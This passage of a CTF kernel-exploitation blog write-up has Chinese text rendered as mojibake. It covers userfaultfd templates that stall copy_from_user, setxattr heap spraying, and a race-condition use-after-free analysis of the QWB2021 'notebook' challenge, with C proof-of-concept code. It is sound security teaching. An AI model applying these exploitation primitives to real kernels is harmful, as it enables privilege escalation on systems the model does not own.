ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//æˆ‘ä»¬è¦ç›‘è§†çš„åŒºåŸŸ</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//æ³¨å†Œç¼ºé¡µé”™è¯¯å¤„ç†</span></span><br><span class="line">    <span class="comment">//å½“å‘ç”Ÿç¼ºé¡µæ—¶ï¼Œç¨‹åºä¼šé˜»å¡ï¼Œæ­¤æ—¶ï¼Œæˆ‘ä»¬åœ¨å¦ä¸€ä¸ªçº¿ç¨‹é‡Œæ“ä½œ</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//å¼€ä¸€ä¸ªçº¿ç¨‹ï¼Œæ¥æ”¶é”™è¯¯çš„ä¿¡å·ï¼Œç„¶åå¤„ç†</span></span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_leak_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] waiting poll\n&quot;</span>);</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] in usefaultfd handler, i will sleep 60s\n&quot;</span>); </span><br><span class="line">    sleep(<span class="number">60</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] sleep done\n&quot;</span>);	</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">setxattr_thread</span><span class="params">(<span class="keyword">void</span>* a)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread created!\n&quot;</span>);</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>,<span class="string">&quot;bling&quot;</span>,a,<span class="number">0x200</span>,<span class="number">0</span>);  </span><br><span class="line">    <span class="comment">//char * temp = malloc(0x200);</span></span><br><span class="line">    <span class="comment">//memcpy(temp,a,0x200);</span></span><br><span class="line">    <span class="comment">//printf(&quot;end copy!\n&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *addr = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	RegisterUserfault(addr+<span class="number">0x1000</span>, userfaultfd_leak_handler);</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    pthread_create(&amp;thr, <span class="literal">NULL</span>, setxattr_thread, addr+<span class="number">0x1000</span><span class="number">-0x100</span>);</span><br><span class="line">	</span><br><span class="line">    pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>





        <h3 id="CTFåˆ©ç”¨æ¨¡æ¿"   >
          <a href="#CTFåˆ©ç”¨æ¨¡æ¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#CTFåˆ©ç”¨æ¨¡æ¿" class="headerlink" title="CTFåˆ©ç”¨æ¨¡æ¿"></a>CTFåˆ©ç”¨æ¨¡æ¿</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/" >userfaultfd çš„ä½¿ç”¨-ctfwiki</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//æˆ‘ä»¬è¦ç›‘è§†çš„åŒºåŸŸ</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//æ³¨å†Œç¼ºé¡µé”™è¯¯å¤„ç†</span></span><br><span class="line">    <span class="comment">//å½“å‘ç”Ÿç¼ºé¡µæ—¶ï¼Œç¨‹åºä¼šé˜»å¡ï¼Œæ­¤æ—¶ï¼Œæˆ‘ä»¬åœ¨å¦ä¸€ä¸ªçº¿ç¨‹é‡Œæ“ä½œ</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//å¼€ä¸€ä¸ªçº¿ç¨‹ï¼Œæ¥æ”¶é”™è¯¯çš„ä¿¡å·ï¼Œç„¶åå¤„ç†</span></span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_leak_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">30</span>);</span><br><span class="line">    <span class="comment">// pause();			//æ ¹æ®å®é™…æƒ…å†µåœ¨è¿™é‡Œæ·»åŠ å¤„ç†ä»£ç ï¼Œæˆ–è€…ç›´æ¥æš‚åœæˆ–sleep</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>ä½¿ç”¨æ–¹æ³•ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">RegisterUserfault(addr, handler);</span><br></pre></td></tr></table></div></figure>



        <h2 id="setxattrç³»ç»Ÿè°ƒç”¨"   >
          <a href="#setxattrç³»ç»Ÿè°ƒç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#setxattrç³»ç»Ÿè°ƒç”¨" class="headerlink" title="setxattrç³»ç»Ÿè°ƒç”¨"></a>setxattrç³»ç»Ÿè°ƒç”¨</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/setxattr.2.html" >setxattr(2) â€” Linux manual page</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.onitroad.com/jc/linux/man-pages/linux/man2/fsetxattr.2.html" >SETXATTR - Linuxæ‰‹å†Œé¡µ</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://duasynt.com/blog/linux-kernel-heap-spray" >Linux Kernel universal heap spray</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><code>setxattr</code>æ˜¯ä¸€ä¸ªlinuxç³»ç»Ÿè°ƒç”¨ï¼ŒåŒæ—¶åœ¨libcä¸­ä¹Ÿæœ‰åŒåçš„å°è£…å‡½æ•°ã€‚é€šè¿‡<code>setxattr()</code>å¯ä»¥ç»™ç³»ç»Ÿä¸­inodeï¼ˆæ–‡ä»¶ï¼Œç›®å½•ï¼Œç¬¦å·é“¾æ¥ï¼‰è®¾ç½®æ‰©å±•å±æ€§ï¼ˆname:valueå¯¹ï¼‰ã€‚ä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* value = <span class="string">&quot;someting...&quot;</span></span><br><span class="line">setxattr(<span class="string">&quot;/exp&quot;</span>,<span class="string">&quot;bling&quot;</span>,value,<span class="number">0x20</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></div></figure>
<p>å¯¹åº”åˆ°å†…æ ¸è°ƒç”¨è·¯å¾„ï¼š</p>
<p><img   src="image-20230301180427383.png?size=600" style="width: 600px;"  alt="image-20230301180427383"></p>
<p>å†…æ ¸<code>setxattr()</code>å‡½æ•°ä¸­çš„ä¸»è¦å¤„ç†è¿‡ç¨‹å¦‚ä¸‹ï¼Œæ ¹æ®ç”¨æˆ·æ€ä¼ å…¥çš„sizeç”³è¯·å¯¹åº”å¤§å°ï¼ˆ0&lt;size&lt;65535ï¼‰çš„å†…å­˜ç©ºé—´ï¼Œå¹¶å°†ç”¨æˆ·æ€æ•°æ®æ‹·è´åˆ°è¯¥ç©ºé—´ä¸­ï¼Œé€€å‡ºæ—¶ä¼šé‡Šæ”¾è¯¥å†…å­˜ç©ºé—´ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">long</span></span><br><span class="line">setxattr(struct user_namespace *mnt_userns, struct dentry *d,</span><br><span class="line">	 <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value, <span class="keyword">size_t</span> size,</span><br><span class="line">	 <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">	<span class="keyword">if</span> (size) &#123;</span><br><span class="line">		<span class="keyword">if</span> (size &gt; XATTR_SIZE_MAX)			<span class="comment">// sizeä¸èƒ½å¤§äº65535</span></span><br><span class="line">			<span class="keyword">return</span> -E2BIG;</span><br><span class="line">		kvalue = kvmalloc(size, GFP_KERNEL);		<span class="comment">// ä¸ºvalueç”³è¯·sizeå¤§å°çš„å†…å­˜ç©ºé—´</span></span><br><span class="line">		<span class="comment">// ...</span></span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;	<span class="comment">// å°†ç”¨æˆ·æ€çš„valueå†…å®¹æ‹·è´åˆ°å†…æ ¸æ€ç”³è¯·çš„ç©ºé—´ä¸­</span></span><br><span class="line">			error = -EFAULT;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// ...</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">out:</span><br><span class="line">	kvfree(kvalue);		<span class="comment">// è®¾ç½®å®Œæˆåï¼Œé€€å‡ºå‡½æ•°å‰é‡Šæ”¾æ‰ç”³è¯·çš„å†…å­˜ç©ºé—´</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>æ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­æœ‰ä¸¤ç§ä½¿ç”¨æ–¹æ³•ï¼š</p>
<ol>
<li>ç»“åˆuserfaultfdï¼Œè·¨é¡µé¢æ‹·è´æ—¶è®©è¿›ç¨‹åœåœ¨<code>copy_from_user</code>å¤„ã€‚å¯¹UAFå †ï¼Œç›¸æ¯”å…¶ä»–ç»“æ„ä½“ï¼Œsetxattrå¯è¦†ç›–å‰8å­—èŠ‚å†…å®¹</li>
<li>çº¯ç²¹å¾€å †ä¸Šå–·æ•°æ®</li>
</ol>

        <h1 id="é¢˜ç›®1-å¼ºç½‘æ¯2021-notebook"   >
          <a href="#é¢˜ç›®1-å¼ºç½‘æ¯2021-notebook" class="heading-link"><i class="fas fa-link"></i></a><a href="#é¢˜ç›®1-å¼ºç½‘æ¯2021-notebook" class="headerlink" title="é¢˜ç›®1 - å¼ºç½‘æ¯2021 notebook"></a>é¢˜ç›®1 - å¼ºç½‘æ¯2021 notebook</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/#qwb2021-notebook" >QWB2021-notebook</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253835" >ä»å¼ºç½‘æ¯ 2021 çº¿ä¸Šèµ›é¢˜ç›® notebook ä¸­æµ…æ userfaultfd åœ¨ kernel pwn ä¸­çš„åˆ©ç”¨</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/385645268" >ç¬¬äº”å±Šå¼ºç½‘æ¯çº¿ä¸Šèµ›å† å†›é˜Ÿ WriteUp - Pwn ç¯‡</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>åšè¿™ä¸ªé¢˜å‰ï¼Œé¦–å…ˆè¦äº†è§£è¯»å†™é”çš„åŸç†ï¼š</p>
<ul>
<li>å½“å†™é”è¢«å–èµ°æ—¶ï¼Œæ‰€æœ‰å–é”æ“ä½œè¢«é˜»å¡</li>
<li>å½“è¯»é”è¢«å–èµ°æ—¶ï¼Œå–å†™é”çš„æ“ä½œè¢«é˜»å¡</li>
</ul>

        <h2 id="åˆ†æ"   >
          <a href="#åˆ†æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2>
      <p>é¢˜ç›®é™„ä»¶ï¼š<a href="QWB2021-notebook.zip">QWB2021-notebook.zip</a></p>
<p>å…ˆçœ‹<code>notebook.ko</code>çš„é€»è¾‘ï¼š</p>
<ul>
<li>noteaddï¼ˆ0x100ï¼‰ï¼šä¸ºnotebook[idx]-&gt;noteç”³è¯·ä¸€ç‰‡sizeå¤§å°çš„ç©ºé—´</li>
<li>notegiftï¼ˆ0x64ï¼‰ï¼šå°†notebookå¤„å­˜æ”¾çš„noteå’Œsizeä¿¡æ¯ï¼ˆ256ä¸ªå­—èŠ‚ï¼‰å…¨éƒ¨æ‹·è´ç»™ç”¨æˆ·æ€ï¼ˆä¿¡æ¯æ³„éœ² - æ³„éœ²å †åœ°å€ï¼‰</li>
<li>notedelï¼ˆ0x200ï¼‰ï¼šfreeæ‰notebook[idx]-&gt;noteå¯¹åº”çš„ç©ºé—´ï¼Œåœ¨sizeä¸ä¸º0çš„æƒ…å†µä¸‹ï¼Œæ¸…ç©ºbssæ®µä¸Šçš„å†…å®¹</li>
<li>noteeditï¼ˆ0x300ï¼‰ï¼šä¿®æ”¹notebook[idx]-&gt;noteå’Œsizeï¼Œé€»è¾‘æœ‰é—®é¢˜å¯¼è‡´sizeå˜ä»»æ„å¤§å°ï¼Œå¹¶ç”³è¯·ä»»æ„å¤§å°çš„å †ã€‚ï¼ˆè¿™é‡Œå­˜åœ¨æ¡ä»¶ç«äº‰ï¼Œå¯å¯¼è‡´UAFï¼‰</li>
<li>mynote_readï¼šæ ¹æ®ä¼ å…¥çš„idxï¼Œå°†notebook[idx]-&gt;noteå†…å®¹è¯»å‡ºã€‚æœ‰<code>_check_object_size()</code>æ£€æŸ¥ï¼Œå †å’Œå¤§å°åŒ¹é…æ—¶æ‰èƒ½æ­£ç¡®è¯»å‡ºï¼Œé˜²æ­¢å †çš„è¶Šç•Œè¯»å†™ã€‚</li>
<li>mynote_writeï¼šæ ¹æ®ä¼ å…¥çš„idxï¼Œæ›´æ–°notebook[idx]-&gt;noteçš„å†…å®¹ã€‚ä¹Ÿæœ‰<code>_check_object_size()</code>æ£€æŸ¥ã€‚</li>
</ul>
<p>ç„¶åçœ‹ä¸€ä¸‹é”çš„æƒ…å†µï¼Œ<code>noteadd()</code>å’Œ<code>noteedit()</code>ä¸­éƒ½æœ‰è¯»é”ï¼Œ<code>notedel()</code>ä¸­æœ‰å†™é”ï¼Œå…¶ä»–å‡½æ•°æœªä½¿ç”¨é”ã€‚å†™é”è®¾ç½®åï¼Œè¯»é”å°†è¢«é˜»å¡ï¼Œæ‰€ä»¥<code>notedel()</code>æ— æ³•æ¡ä»¶ç«äº‰ã€‚è€Œ<code>noteadd()</code>å’Œ<code>noteedit()</code>è®¾ç½®äº†è¯»é”ï¼Œå´éƒ½å¯¹notebook[idx].sizeæœ‰å†™çš„æ“ä½œï¼Œå› æ­¤æ¡ä»¶ç«äº‰å¯ä»¥ä»å®ƒä»¬å½“ä¸­æ„é€ ã€‚</p>
<p><code>noteedit()</code>å‡½æ•°æ¼æ´çš„å…³é”®ç‚¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">v5 = &amp;notebook[idx];</span><br><span class="line"> raw_read_lock(&amp;lock);</span><br><span class="line"> size = v5-&gt;size;</span><br><span class="line"> v5-&gt;size = newsize;                           <span class="comment">// noteboot[idx].sizeå¯ä»¥è¢«æ”¹å¤§</span></span><br><span class="line"> <span class="keyword">if</span> ( size == newsize )</span><br><span class="line"> &#123;</span><br><span class="line">   v8 = <span class="number">1LL</span>;</span><br><span class="line">   <span class="keyword">goto</span> editout;</span><br><span class="line"> &#125;</span><br><span class="line"> v7 = (*(__int64 (__fastcall **)(<span class="keyword">void</span> *, <span class="keyword">size_t</span>, __int64))krealloc.gap0)(v5-&gt;note, newsize, <span class="number">0x24000C0</span>LL);				<span class="comment">// kreallocä¼šé‡Šæ”¾v5-&gt;noteï¼Œä½†v5-&gt;noteå€¼ä¿æŒä¸å˜ã€‚åœ¨æ›´æ–°v5-&gt;noteä¹‹å‰ï¼Œå…¶ä»–çº¿ç¨‹ä»å¯è®¿é—®è¯¥é‡Šæ”¾çš„å †å—ï¼Œå¯¼è‡´UAFã€‚åªä¸è¿‡è¿™ä¸ªæ¡ä»¶ç«äº‰çš„æ—¶é—´çª—å£å¾ˆå°ã€‚</span></span><br><span class="line"> copy_from_user(name, v4, <span class="number">0x100</span>LL);            <span class="comment">// æ‰€ä»¥åœ¨è¿™é‡Œä½¿ç”¨userfaultfdè®©é‡Šæ”¾çº¿ç¨‹å¡ä½ï¼Œå»¶é•¿æ—¶é—´çª—å£ï¼Œå…¶ä»–çº¿ç¨‹UAF</span></span><br><span class="line"> <span class="keyword">if</span> ( !v5-&gt;size )</span><br><span class="line"> &#123;</span><br><span class="line">   printk(<span class="string">&quot;free in fact&quot;</span>);</span><br><span class="line">   v5-&gt;note = <span class="number">0LL</span>;</span><br><span class="line">   v8 = <span class="number">0LL</span>;</span><br><span class="line">   <span class="keyword">goto</span> editout;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)_virt_addr_valid(v7) )</span><br><span class="line"> &#123;</span><br><span class="line">   v5-&gt;note = (<span class="keyword">void</span> *)v7;		<span class="comment">// æ›´æ–°v5-&gt;noteçš„å€¼</span></span><br></pre></td></tr></table></div></figure>
<p><code>noteadd()</code>å‡½æ•°æ¼æ´çš„å…³é”®ç‚¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v4 = v3;</span><br><span class="line">v5 = &amp;notebook[idx];</span><br><span class="line">raw_read_lock(&amp;lock);</span><br><span class="line">v6 = v5-&gt;size;</span><br><span class="line">v5-&gt;size = size;						<span class="comment">// notebook[idx]-&gt;sizeè¢«è®¾ç½®</span></span><br><span class="line"><span class="keyword">if</span> ( size &gt; <span class="number">0x60</span> )                          </span><br><span class="line">&#123;</span><br><span class="line">  v5-&gt;size = v6;</span><br><span class="line">  v7 = <span class="number">-2LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;[x] Add size out of range.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;notebook[idx]-&gt;sizeå°äº<span 